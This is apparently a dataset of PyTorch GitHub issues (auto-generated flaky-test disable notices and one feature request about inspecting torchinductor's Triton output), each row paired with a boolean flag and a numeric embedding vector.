  1.99140012e-02  3.66187617e-02 -1.76517181e-02 -2.72971570e-01
 -8.66260193e-03  1.44065231e-01 -2.03462467e-01  3.88212681e-01
 -7.84767326e-03  5.09391725e-02  3.30721557e-01 -3.30343187e-01
  1.97425693e-01 -1.16520911e-01  3.92882712e-02 -1.19445682e-01
  6.44638166e-02  3.74648482e-01 -1.23605616e-02  1.37236848e-01]"
DISABLED test_layer_norm_backward_5d_size_4_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_5d_size_4_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18163699213).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_5d_size_4_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-1.85657784e-01  2.69581452e-02 -1.69318751e-01  8.28210637e-03
 -1.72079086e-01 -2.64073700e-01 -1.03637297e-02  1.99680090e-01
 -4.85788316e-01 -1.16209231e-01  3.99088204e-01 -1.60839185e-01
  3.96929502e-01  1.09718010e-01 -1.32086456e-01 -1.99616775e-02
 -2.51101553e-01 -9.76796746e-02  3.50105405e-01  1.04297727e-01
 -1.13404393e-01 -8.78339335e-02 -2.24422112e-01  3.03718090e-01
  1.65615916e-01  8.52827728e-03 -2.21893221e-01 -7.32527226e-02
  1.85205489e-01  7.54857510e-02  1.73499867e-01  1.17692940e-01
 -2.97696173e-01 -6.64053410e-02  5.32639861e-01  1.82251632e-01
 -8.59536976e-02 -1.71936184e-01 -4.01395500e-01 -1.70765091e-02
  2.31852680e-01  1.36223584e-01 -1.37063980e-01 -7.83331543e-02
  1.99180916e-01  2.39277631e-02 -1.51611418e-01  3.20712179e-01
 -3.30959171e-01 -2.67470151e-01  2.21066132e-01 -1.50963515e-01
 -4.90776375e-02 -3.79530311e-01  5.24660237e-02 -3.15175653e-01
  1.58826113e-01  3.49208981e-01  1.01186037e-01  3.05434525e-01
  1.01153739e-01 -4.84546162e-02 -8.34849402e-02 -1.13788441e-01
 -6.17246777e-02  9.84440893e-02  2.02905521e-01 -1.56004816e-01
  3.00097615e-01  7.10658878e-02  1.66072786e-01 -4.43982445e-02
 -3.67015421e-01 -5.56585416e-02  2.72107601e-01  1.83178708e-01
 -2.88851857e-01  3.52230370e-02 -9.24290419e-02 -1.12483948e-01
 -7.96365887e-02  3.89007106e-02  4.96800989e-02  5.79469427e-02
  7.54472092e-02 -1.57923847e-02  1.57849208e-01 -7.34032393e-02
  9.62018222e-02 -2.34987050e-01  3.43080521e-01  1.89221263e-01
 -3.18111986e-01  4.67909575e-02 -1.07651502e-01 -1.09437093e-01
  2.03455389e-01 -2.44396061e-01 -2.58618653e-01  1.80836529e-01
  2.29980052e-01 -4.27595675e-01 -1.34185955e-01  4.36676830e-01
 -1.81368053e-01 -1.77887768e-01  4.65346038e-01  1.52590424e-01
 -6.54209703e-02 -7.63357431e-02  1.70818046e-01 -1.90507639e-02
 -7.08217919e-02  7.00151026e-02  1.23001523e-01 -1.17033586e-01
 -1.85842812e-01 -1.41031861e-01  4.20589652e-03  4.78979647e-01
 -1.68213606e-01 -6.91003203e-02  1.43999457e-01 -1.27062052e-01
  3.53112578e-01 -2.60623824e-02  5.96819595e-02  1.71424523e-02
  1.50285155e-01  1.04831390e-01  1.13939047e-01  2.40587980e-01
 -1.81428000e-01 -2.86159106e-02  5.09881079e-02  1.05263010e-01
 -1.17126547e-01 -2.58777171e-01  2.82018837e-02  6.50023744e-02
 -3.69652867e-01  2.99580157e-01  2.73784511e-02 -2.56022543e-01
  5.11003137e-01  5.47263548e-02 -2.87977368e-01  1.51085690e-01
 -3.53970844e-03  6.18948303e-02  5.58711849e-02  2.71679126e-02
  2.48543248e-01  1.92316055e-01  1.35783941e-01 -2.44852342e-03
  2.15383992e-01  4.79993857e-02  8.65216032e-02 -1.68098599e-01
 -2.13342234e-02  3.52234095e-01 -1.48168266e-01  8.40034261e-02
  2.34714091e-01 -5.89750893e-02 -4.74255264e-01 -3.61861624e-02
  3.02028991e-02  1.55616865e-01  4.64287177e-02  3.24546769e-02
  1.96996465e-01  4.55405898e-02  1.23507522e-01 -2.36680791e-01
  1.09784037e-01 -3.91669244e-01 -6.28321469e-02  2.40561783e-01
  1.02579951e-01 -5.34116924e-02  2.32690737e-01  6.08167835e-02
 -2.15333402e-02  1.95865691e-01  2.86280572e-01 -1.02883264e-01
  3.61787565e-02 -1.02559768e-01 -6.91265523e-01 -1.73906714e-01
  7.55857527e-02  7.51885697e-02 -2.18255237e-01 -3.74943614e-01
  2.51596719e-02 -3.94423008e-02 -7.34851211e-02  5.86895570e-02
 -2.61122704e-01  3.46421570e-01  2.46771038e-01 -3.96203399e-02
  6.03738800e-03  1.77660510e-01 -1.83399707e-01 -3.85209799e-01
  1.59139093e-02  1.36198565e-01 -2.93897092e-01 -1.30082369e-01
 -4.22364362e-02 -4.15344238e-01  2.28599627e-02  1.78823084e-01
  8.51897225e-02 -6.59147054e-02 -3.99198383e-04  1.85527444e-01
 -2.14492500e-01 -9.51969177e-02 -3.74827623e-01 -1.42141789e-01
 -4.46552694e-01 -3.37012224e-02 -2.12995261e-01  4.07933414e-01
 -4.64546345e-02  6.61357939e-02 -1.83232546e-01 -5.96047640e-02
  1.87487260e-01  3.67514193e-02  4.12358612e-01 -3.89961481e-01
 -1.61994785e-01 -7.75338039e-02  7.19375014e-02  5.22077203e-01
 -6.52340949e-01 -5.33147454e-01 -3.28216292e-02  3.27419154e-02
 -5.20047694e-02  2.02248007e-01  1.54294334e-02 -4.95656505e-02
 -8.74487683e-02  1.32649496e-01 -3.77543300e-01 -3.01291645e-01
  1.98221639e-01 -3.11834458e-02  7.46164322e-02  2.81380028e-01
 -7.50224292e-02  1.74619257e-01 -8.34333524e-03 -4.95740771e-03
 -5.47606535e-02  4.39682096e-01 -1.36594817e-01  4.74137932e-01
  7.24149495e-02  7.12201893e-02 -1.57344386e-01  4.91392538e-02
 -1.89916641e-02 -1.39684379e-01  4.42413181e-01 -7.02403843e-01
  5.88815585e-02  1.24742560e-01  1.43606603e-01 -1.43064946e-01
  3.87494266e-01  1.50061578e-01 -5.19501604e-02 -2.28923410e-01
  4.21560407e-02  2.38863990e-01 -1.82485253e-01 -9.80309397e-02
  2.75950074e-01 -4.36947584e-01 -1.31303936e-01 -1.06776029e-01
 -2.32879907e-01 -1.68934405e-01  1.84274893e-02  2.19338596e-01
  3.91764753e-02  2.50230357e-03 -4.08984572e-01  1.54515833e-01
  2.71250099e-01 -3.08092654e-01 -1.34746637e-02 -3.96102995e-01
 -6.77242428e-02  9.34918523e-02  1.71331272e-01 -2.13567019e-01
  7.95422215e-03 -2.19746474e-02  1.55342862e-01 -2.56662555e-02
  4.58201170e-01 -2.60317445e-01  2.51150131e-01  2.52753168e-01
 -9.64839756e-02  3.22586805e-01  3.63342464e-02 -1.13235954e-02
 -6.09061047e-02  1.24763913e-01  7.82537684e-02  1.09519422e-01
  3.67056727e-01 -1.05936930e-01 -3.33662242e-01  1.53696194e-01
  1.07007772e-01 -1.86924487e-01 -3.86879891e-01 -9.59723517e-02
 -9.77493227e-02  7.07305446e-02 -5.54409400e-02 -3.00867222e-02
 -1.19279139e-01 -1.50830328e-01  5.31638414e-02 -9.51525494e-02
 -2.88428038e-01  5.75332224e-01  1.72681138e-02 -1.55261695e-01
  1.77018180e-01  7.18997568e-02  1.04786456e-01 -3.37713480e-01
 -9.87542346e-02 -2.71019693e-02  1.78511903e-01  1.73759639e-01
  2.22391307e-01  1.80359498e-01  6.21321127e-02 -5.84554672e-03
 -4.11603272e-01 -1.54252976e-01 -8.34360272e-02  4.07957822e-01
  1.42397612e-01  1.98064744e-02  1.75798520e-01  7.26199448e-01
 -1.91829965e-01 -1.58595800e-01 -2.02633262e-01 -2.87686020e-01
  2.87652910e-01 -1.84183463e-01  7.88248777e-02 -5.01492135e-02
  3.72908227e-02  2.41180658e-01 -3.29127192e-01  2.93933392e-01
 -1.65997863e-01  2.82525897e-01  1.18445262e-01 -1.38807967e-01
  1.10385984e-01 -2.21251801e-01 -6.07951805e-02 -3.09081282e-02
 -3.16693664e-01  9.48475003e-02 -3.84515561e-02  1.54836923e-01]"
Access triton code generated by torchinductor backend ,"### ðŸš€ The feature, motivation and pitch

would look to take a look at the triton code generated by torchinductor when using `torch.compile` for debugging purposes, is there a way to do that?

### Alternatives

_No response_

### Additional context

_No response_",False,"[-8.02643776e-01  4.76403773e-01 -1.36984497e-01 -1.23043776e-01
  1.43844890e-03  2.39542529e-01 -1.09694339e-01  1.28911838e-01
 -6.09831035e-01 -1.32800773e-01  9.04133171e-03 -3.19702089e-01
 -3.20351660e-01  3.38302292e-02  2.29754165e-01  1.32204935e-01
 -2.56165564e-01  1.53533101e-01 -6.22006953e-02 -5.38183331e-01
  2.98291028e-01  3.53296113e-04 -3.50144878e-02 -1.27545476e-01
  1.67494893e-01  1.16801538e-01 -1.47002488e-01  7.29524940e-02
  2.50451356e-01  8.37040544e-02 -1.84381064e-02  6.88566267e-02
 -2.92539179e-01 -1.29406678e-03  1.11320995e-01 -1.98882997e-01
 -7.16084018e-02  1.32874683e-01 -1.47609979e-01  2.90089846e-02
 -9.94584411e-02  3.73798847e-01  7.38307685e-02 -2.26810463e-02
  4.02737446e-02 -2.52925068e-01 -1.83514804e-01  1.29689977e-01
 -1.84671387e-01 -1.60850093e-01  2.96770126e-01  2.41300672e-01
 -3.63555029e-02  2.72617638e-01 -1.53615907e-01 -1.23187900e-01
  6.67172391e-03 -4.70795855e-02 -8.58318582e-02 -3.55926871e-01
  3.25302273e-01 -3.28485258e-02 -2.37602189e-01 -7.00010657e-02
 -1.62633136e-01 -5.66485524e-02 -3.34318697e-01  2.10768268e-01
  4.98780251e-01 -1.79481789e-01  1.28527910e-01 -1.41241029e-01
  1.15706146e-01 -3.71583581e-01 -5.79015836e-02 -3.05388898e-01
 -6.03407502e-01  2.29943037e-01 -3.18470180e-01 -1.47490576e-01
  2.47021869e-01  5.86887710e-02 -9.62296799e-02  1.24120437e-01
  3.41776423e-02 -2.19366085e-02 -2.90930532e-02 -1.76734179e-01
  4.94876772e-01  3.84205639e-01 -1.52487904e-01 -7.25216269e-02
 -8.69676024e-02  8.91565830e-02 -4.17419434e-01  1.61599547e-01
  2.40750641e-01 -2.47719124e-01 -9.41953957e-02 -1.47954047e-01
 -3.65619361e-01 -3.56759608e-01 -2.85867155e-01 -1.20182432e-01
  1.12269439e-01 -1.61587983e-01  2.27692991e-01  5.70489883e-01
  1.93323106e-01 -3.00410241e-01  2.17951536e-01  2.22887754e-01
 -1.32197067e-01 -6.02710620e-02 -5.00012860e-02  8.75577480e-02
 -1.04592659e-01 -2.52496243e-01  1.53913617e-01  2.23245308e-01
  5.05394340e-01  2.79402822e-01 -1.21412739e-01  4.05673325e-01
  3.50882471e-01 -9.43129063e-02 -3.06784689e-01 -1.51275247e-01
  1.35413319e-01  2.50196874e-01  1.23120144e-01  3.08009267e-01
  3.15101385e-01 -1.74029678e-01  3.10928613e-01  1.91751301e-01
 -3.27158362e-01 -1.71439961e-01 -2.14504600e-01  4.38773911e-03
 -1.64953738e-01  7.52214715e-02 -2.21610546e-01 -4.82038349e-01
 -1.61306083e-01 -1.37782186e-01 -3.74300957e-01 -1.46425128e-01
  6.93214312e-02  8.50892887e-02 -3.86755653e-02 -1.52885318e-01
 -2.63416052e-01  3.16983759e-01  2.25007862e-01 -9.26170722e-02
  7.78902182e-03  1.69134706e-01  4.54623640e-01 -2.28113234e-02
  4.33464915e-01  3.30554724e-01  5.77518284e-01 -2.67327935e-01
  8.73129442e-02 -5.17214537e-02 -5.43121770e-02  4.33274135e-02
 -2.82200966e-02  7.99193755e-02 -1.87928826e-01 -4.96378005e-01
 -1.21308520e-01 -3.69725287e-01  1.84148639e-01 -7.18726516e-02
 -1.54270353e-02 -3.54923040e-01  9.72751807e-03  6.56155884e-01
  1.89643264e-01  2.95956463e-01  3.02065194e-01 -1.50505647e-01
 -7.30639091e-03  4.58066553e-01  2.26545453e-01  3.30830179e-02
 -3.19638774e-02  7.28885550e-03 -1.47337124e-01 -3.92626345e-01
  3.21359396e-01 -1.48680687e-01 -1.41767934e-01  1.14009321e-01
 -1.85328513e-01 -1.33674949e-01 -4.13299799e-01 -2.12094113e-01
 -2.63072643e-02  1.14832327e-01 -1.63734570e-01 -1.45070821e-01
 -1.32927462e-01  1.21593745e-02 -1.66183800e-01 -2.26827860e-01
 -1.55162916e-01 -2.53173172e-01 -2.00382710e-01 -3.32630217e-01
  1.82084322e-01 -1.35253370e-01 -1.41130043e-02 -1.03088751e-01
 -1.64837733e-01 -4.09974009e-01 -1.39434244e-02  2.83155143e-01
  3.39619786e-01 -7.98006367e-04  1.65296227e-01 -1.70664966e-01
  4.19326760e-02  2.01550767e-01 -2.25883394e-01 -2.93646514e-01
 -6.67628720e-02 -8.74492303e-02 -1.79360896e-01 -7.16936409e-01
  3.55502725e-01  3.97538096e-01  6.83939382e-02  5.36202312e-01
 -3.17556486e-02 -2.66218446e-02 -1.24707058e-01  3.66344443e-03
 -2.54864693e-02 -1.37690097e-01  1.84087798e-01 -1.70307130e-01
  1.05057321e-01  4.98449579e-02 -2.48437241e-01 -4.42692608e-01
 -5.49031682e-02 -1.37141183e-01 -2.78648874e-03  2.70938814e-01
  2.63579905e-01 -2.14654356e-01  4.63266373e-01  1.77119985e-01
  1.34925665e-02 -4.66564894e-02 -1.45478994e-02 -5.94002195e-02
  2.69103765e-01  2.63356626e-01  1.41932547e-01 -1.11795112e-01
  4.72289026e-01 -1.89532667e-01  2.42150873e-01  2.63088614e-01
  6.18802896e-03  1.20122597e-01 -2.41930321e-01 -2.18443066e-01
  1.07786211e-03  3.10961783e-01  2.14262053e-01 -1.85940996e-01
  1.06811427e-01 -4.01992232e-01  1.53730422e-01 -1.46114305e-01
  2.93419570e-01  1.61621764e-01  1.43896326e-01  4.06155407e-01
  2.94309705e-01 -4.21341002e-01  2.65110042e-02 -9.26838145e-02
  1.40925243e-01 -7.27814212e-02 -5.64375877e-01  9.58385393e-02
  7.16016302e-03 -1.85049370e-01 -5.20601392e-01  1.23048447e-01
  2.64272034e-01 -2.94802368e-01 -3.48793864e-01  4.30967242e-01
 -5.85454218e-02  8.50530043e-02  2.64252275e-01 -3.37377965e-01
 -5.90095334e-02 -2.05211610e-01  2.58415222e-01  1.41675830e-01
  6.68667614e-01 -3.04618746e-01 -9.24345385e-03  4.17030424e-01
 -8.29864144e-02  4.16827440e-01 -1.53706253e-01  1.32331997e-01
 -1.29097030e-01  2.38197058e-01  2.00336501e-01  6.65047392e-02
 -1.93856925e-01 -1.69529229e-01 -1.59698464e-02  1.45174980e-01
  7.15996772e-02  4.50245857e-01  1.38472468e-02  4.45334837e-02
  3.50515693e-01 -2.85855047e-02  1.93739012e-01  4.89913952e-03
  3.42291445e-01  1.21967815e-01  7.52643421e-02 -3.53247344e-01
  8.11374038e-02  4.57886271e-02 -1.71547534e-03 -3.11652035e-01
 -2.25998998e-01 -6.29882365e-02 -3.15901935e-02  6.86221272e-02
 -2.38771990e-01  2.41684839e-02  2.73372263e-01  3.37053031e-01
 -9.11592990e-02  7.79212713e-02  7.18394071e-02  7.44761303e-02
  2.07393505e-02  2.49855474e-01  1.42416075e-01  3.18487287e-01
 -5.61200082e-03  2.51291152e-02 -1.35644123e-01 -2.84360945e-01
  1.59832388e-01  2.16062114e-01 -7.06777394e-01  2.14135453e-01
  1.27072930e-01 -1.19307697e-01  1.64567590e-01 -1.38026863e-01
 -1.54312938e-01  2.59730369e-01 -3.75612915e-01  7.72121921e-02
  2.38748461e-01  3.41208398e-01  3.86293083e-01 -1.23281397e-01
  2.95678526e-01 -2.77335346e-01  9.60666612e-02  2.10402161e-01
  3.28896306e-02  1.75357670e-01 -2.60678560e-01 -3.38719413e-02]"
DISABLED test_derpy_nn_module_usage (__main__.MiscTests) triaged module: flaky-tests skipped module: dynamo,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_derpy_nn_module_usage&suite=MiscTests) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18132406858).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_derpy_nn_module_usage`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `dynamo/test_misc.py`

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False,"[-0.11712125 -0.0825503  -0.1275408  -0.07467444  0.09633973 -0.29268312
  0.31602186  0.18613218 -0.3202082  -0.37194958  0.14731076 -0.09099425
  0.3512501  -0.17702016 -0.1915091  -0.34170997 -0.00164736 -0.22882952
  0.2875923  -0.07158119 -0.24498075  0.16595551 -0.09145598  0.2713411
 -0.0389547   0.00562254 -0.15473537 -0.02852475 -0.13123065  0.08768214
  0.34251186  0.3867303  -0.65690184 -0.05311356  0.3874277   0.22496831
 -0.09121718 -0.2956482  -0.11813101 -0.17226322  0.07020077  0.07952589
  0.04426072 -0.14080453  0.2051305   0.00377675 -0.3777036   0.0151945
 -0.2834173  -0.0811757   0.15289825 -0.03789178  0.21948367 -0.51603717
  0.20466694 -0.40758204  0.06843029  0.4023718  -0.0287659   0.16037434
 -0.25767797  0.00520305 -0.20799105  0.15802395 -0.05612273 -0.00067854
  0.18358739 -0.00890646  0.53461397  0.00933375  0.10798371  0.05229947
 -0.3719669  -0.00255923  0.08393729  0.35250407 -0.08908954  0.07314518
 -0.10724863 -0.4182299   0.06406204  0.3500512   0.2865947  -0.16593598
  0.24718654  0.14758301  0.1325095  -0.02139425  0.0965122  -0.17753983
  0.5071252  -0.09091899 -0.04061286  0.12540573 -0.07090309  0.18635498
  0.29783285 -0.12121195 -0.2962088   0.16568735 -0.01148663 -0.37914845
 -0.16969252  0.27663803 -0.1214364  -0.17837808  0.42658424  0.05431769
  0.18131575 -0.2836349   0.21040821 -0.1364095  -0.01186559  0.11553022
  0.12965792 -0.12136011 -0.13881926 -0.21140322 -0.05890846  0.41687447
 -0.15701342 -0.0214059   0.20294853 -0.05949222  0.30579278  0.07840788
  0.04527267  0.05751701 -0.0484373  -0.17999667  0.08770199  0.0911272
 -0.47248948  0.1002122   0.11988167  0.16583453 -0.12479664 -0.2955113
  0.04804729  0.21091089 -0.3078569  -0.14974701  0.06703907 -0.07734936
  0.106999    0.00360903 -0.35714906 -0.00721308 -0.14519104 -0.00543856
  0.15159073  0.11462379  0.045857    0.49120104 -0.00544762  0.10236827
  0.3541778   0.08192276 -0.13882619 -0.1694338   0.10395038  0.50913876
 -0.21674524  0.11342888  0.02238503  0.12255031 -0.4758135   0.05851159
 -0.1110917   0.01222533 -0.12353824  0.076924    0.06334949 -0.28793645
  0.04887609 -0.21633503  0.03973345 -0.046645   -0.11688623  0.41499722
 -0.05574679  0.32357115  0.08572312  0.4198717   0.00209189  0.24590646
  0.21198077 -0.03379799  0.1010107   0.17211148 -0.39670706 -0.20638525
  0.31731206  0.02934515 -0.06785893 -0.16101924  0.16738227 -0.08658727
 -0.03921017 -0.10568666 -0.14028403  0.33554566  0.28483596 -0.18214685
 -0.01770651  0.12560079 -0.15201853 -0.3396853   0.26669246  0.04373479
 -0.459018    0.03054816 -0.10290384 -0.3034552  -0.06571313  0.12299364
  0.01336527 -0.21438195  0.14851403  0.37331396 -0.17607218 -0.27053487
 -0.25717586 -0.1790789  -0.05406901  0.00368717 -0.11822945  0.3519391
  0.02704707  0.11205974 -0.07073    -0.1590345   0.20777053  0.26398015
  0.24430539 -0.07632303 -0.02832104 -0.22269127  0.04984228  0.362413
 -0.38627538 -0.43324143 -0.16770512  0.23924835 -0.15048331  0.31200632
 -0.08761347 -0.33801037 -0.5646274  -0.02123066 -0.04887149 -0.40427923
 -0.02052878  0.05386617  0.3694809   0.34193605 -0.11894011 -0.01991384
  0.18435133 -0.24030273  0.22217003  0.55000615 -0.23341545  0.28406107
  0.07056053  0.13708693 -0.14393234  0.22565305  0.08560599 -0.1004791
  0.13175374 -0.56178355  0.27089894  0.18837099  0.35133743 -0.42131925
  0.21721497 -0.04364268 -0.15448728 -0.20656334  0.16018787  0.10587993
 -0.16536823  0.17790939  0.39773387 -0.14546755 -0.23472819 -0.21724392
 -0.26749822 -0.15628119 -0.14281692  0.3781519   0.20810348 -0.08147841
 -0.2257494   0.1269261   0.28119615 -0.2315764   0.09297146  0.05973025
 -0.3305832  -0.06111303  0.05306046 -0.1873212   0.14895421 -0.12594691
  0.09364312  0.05547523  0.27691978 -0.47412884 -0.10035887  0.15875575
 -0.1639955   0.4054484   0.06566584 -0.13292459 -0.24429211  0.47841322
  0.14341103  0.19924554  0.08824813 -0.0989328  -0.36648688  0.08796243
  0.16579174 -0.06496506 -0.3714946   0.04364061 -0.15340966  0.1666718
 -0.09780207 -0.07023668 -0.26839495 -0.1310991  -0.08356494  0.08558695
 -0.0427615   0.48782662  0.00895702 -0.27729863  0.15559076 -0.06527143
  0.07456977 -0.22202112 -0.13267703 -0.15526827  0.05016176  0.2366521
  0.02095943 -0.30986887 -0.05497796  0.02612943 -0.351964    0.05944063
  0.13323987  0.4658356  -0.00550208  0.18872605  0.31338757  0.46933043
 -0.27253723 -0.28331956 -0.4087192  -0.23900132 -0.06599974 -0.04158521
 -0.04917537  0.05384608 -0.07782829  0.1608263  -0.43751413 -0.02640113
 -0.1502694   0.24850634  0.3882479  -0.05696975  0.15669459 -0.08588918
 -0.02718719 -0.01813387 -0.28437766  0.2242057   0.24187002  0.21483043]"
DISABLED test_layer_norm_backward_5d_size_32_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_5d_size_32_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18126685567).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_5d_size_32_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-1.87425613e-01  5.13884835e-02 -1.76564544e-01  1.60224307e-02
 -1.50388032e-01 -2.55211741e-01 -3.83054651e-02  2.03688592e-01
 -4.97295082e-01 -9.88816619e-02  3.94726455e-01 -1.49219096e-01
  3.81675005e-01  8.65203068e-02 -1.17755964e-01 -2.07277201e-02
 -2.21054673e-01 -1.06760234e-01  3.97049427e-01  1.04250789e-01
 -1.16729379e-01 -7.60435089e-02 -2.17520565e-01  3.02799016e-01
  2.03925312e-01  2.48370320e-03 -2.23098934e-01 -4.64104228e-02
  2.01908067e-01  8.04043561e-02  1.86841413e-01  9.42447409e-02
 -2.62865126e-01 -5.39360046e-02  5.36945283e-01  1.78218305e-01
 -8.32197070e-02 -1.70170546e-01 -4.06629384e-01 -5.07845730e-03
  2.16430664e-01  1.53785601e-01 -1.32143199e-01 -9.31732580e-02
  2.06882715e-01  1.86435599e-02 -1.54312655e-01  3.07267696e-01
 -3.22455347e-01 -2.70409286e-01  2.43198633e-01 -1.40144497e-01
 -4.77812029e-02 -3.55677366e-01  4.66743708e-02 -3.14108968e-01
  1.64627135e-01  3.55585217e-01  9.37693939e-02  2.97388136e-01
  1.02028228e-01 -7.28457421e-02 -5.78492470e-02 -1.16298914e-01
 -8.77286494e-02  8.39805305e-02  2.30669931e-01 -1.57276258e-01
  3.12005937e-01  4.80641015e-02  1.62785321e-01 -5.21015897e-02
 -3.62141669e-01 -4.82803993e-02  2.71116018e-01  1.80543065e-01
 -2.92556822e-01  4.07757461e-02 -1.15989320e-01 -1.16594553e-01
 -9.29741710e-02  7.62999430e-03  5.17636277e-02  6.17513210e-02
  8.60987082e-02 -1.97763480e-02  1.65100694e-01 -6.08017817e-02
  1.14039660e-01 -2.39236444e-01  3.27907383e-01  2.01516271e-01
 -3.25425535e-01  4.25217301e-02 -1.04054116e-01 -1.22294880e-01
  2.16552094e-01 -2.11813867e-01 -2.99598068e-01  1.62868783e-01
  2.27460980e-01 -4.31709647e-01 -1.72343209e-01  4.30789888e-01
 -1.75801277e-01 -1.88683182e-01  4.45433080e-01  1.47498637e-01
 -5.82857206e-02 -8.26945379e-02  1.80346310e-01  2.60051480e-03
 -8.62386003e-02  5.33204898e-02  1.39524966e-01 -1.17995255e-01
 -2.24601284e-01 -1.40206903e-01 -6.77234866e-03  4.74791676e-01
 -1.96522579e-01 -7.69948587e-02  1.06807284e-01 -1.23580337e-01
  3.55943620e-01 -1.95934027e-02  6.42639399e-02  2.37525813e-03
  1.55804247e-01  9.08349156e-02  1.03309676e-01  2.58894086e-01
 -1.58870399e-01 -6.12811744e-02  6.94795400e-02  1.07512996e-01
 -1.23172253e-01 -2.79511720e-01  2.32829470e-02  4.62388024e-02
 -3.36393863e-01  3.15347433e-01  4.35635000e-02 -2.52293438e-01
  4.82002288e-01  6.44385740e-02 -2.87161797e-01  1.64509073e-01
 -1.87343992e-02  3.49823758e-02  5.66274077e-02  3.80352661e-02
  2.52563536e-01  1.79614946e-01  1.28738463e-01  9.29729361e-03
  2.12606996e-01  4.59003672e-02  7.24488124e-02 -1.69797972e-01
 -2.62796581e-02  3.47958505e-01 -1.51864290e-01  8.68873894e-02
  2.57591575e-01 -5.13748936e-02 -4.73090678e-01 -4.64774594e-02
  4.47450690e-02  1.61228627e-01  4.50729206e-02  1.69858262e-02
  2.17595786e-01  4.20247838e-02  1.28773496e-01 -2.30077922e-01
  1.36654347e-01 -3.92163366e-01 -7.25828633e-02  2.49452427e-01
  1.35619804e-01 -5.40865064e-02  2.52297878e-01  7.25249723e-02
 -1.52340168e-02  1.99486241e-01  2.71537721e-01 -1.01681359e-01
  4.08159196e-02 -1.09714486e-01 -6.71437085e-01 -1.45442694e-01
  9.23296809e-02  8.12213272e-02 -2.20952064e-01 -3.62387061e-01
  3.40028964e-02 -2.57282369e-02 -8.04638714e-02  6.11591786e-02
 -2.73414075e-01  3.41142446e-01  2.64196396e-01 -2.47427151e-02
 -8.69005919e-04  1.80027902e-01 -1.75293908e-01 -3.93015146e-01
  5.26853539e-02  1.39902830e-01 -3.22315097e-01 -1.17135160e-01
 -3.53183448e-02 -4.04231668e-01  1.09868590e-02  1.69819593e-01
  7.88111091e-02 -9.20300335e-02  1.08768195e-02  1.71089172e-01
 -1.90934643e-01 -8.35532844e-02 -3.58062565e-01 -1.36543840e-01
 -4.43457782e-01 -5.06286584e-02 -2.22820699e-01  3.94664407e-01
 -2.58098617e-02  5.16969487e-02 -1.82416305e-01 -6.17641397e-02
  1.80590555e-01  2.26883218e-03  4.29243207e-01 -4.06019926e-01
 -1.81698605e-01 -6.20564185e-02  5.80514707e-02  5.18842459e-01
 -6.51409268e-01 -5.40556848e-01 -3.86816673e-02  1.97567418e-02
 -4.59658876e-02  1.94375813e-01  4.95592505e-02 -7.41663575e-02
 -7.24863857e-02  1.31415635e-01 -4.00426835e-01 -3.05808932e-01
  2.08118305e-01 -4.49098349e-02  6.33618534e-02  2.95344502e-01
 -8.14950317e-02  1.88507885e-01 -1.58179924e-02 -7.75984116e-03
 -1.00767754e-01  4.66923594e-01 -1.32458925e-01  4.46573853e-01
  8.49798843e-02  6.49069399e-02 -1.71388358e-01  4.95864749e-02
 -2.08121836e-02 -1.29559159e-01  4.65702564e-01 -6.88823462e-01
  4.06571478e-02  1.24480382e-01  1.67197004e-01 -1.32077008e-01
  4.17540073e-01  1.82795793e-01 -3.40965912e-02 -2.39164457e-01
  2.91136280e-02  2.49043420e-01 -1.52128562e-01 -8.26411173e-02
  2.77787983e-01 -4.43501920e-01 -1.36818796e-01 -1.16989866e-01
 -2.47119516e-01 -1.37976006e-01  1.18437996e-02  2.14287221e-01
  7.94188678e-03  5.55164926e-03 -4.14528072e-01  1.53947473e-01
  2.81143069e-01 -2.89363325e-01 -2.20436230e-02 -4.10948396e-01
 -4.78900000e-02  1.02738552e-01  1.61291450e-01 -2.16994405e-01
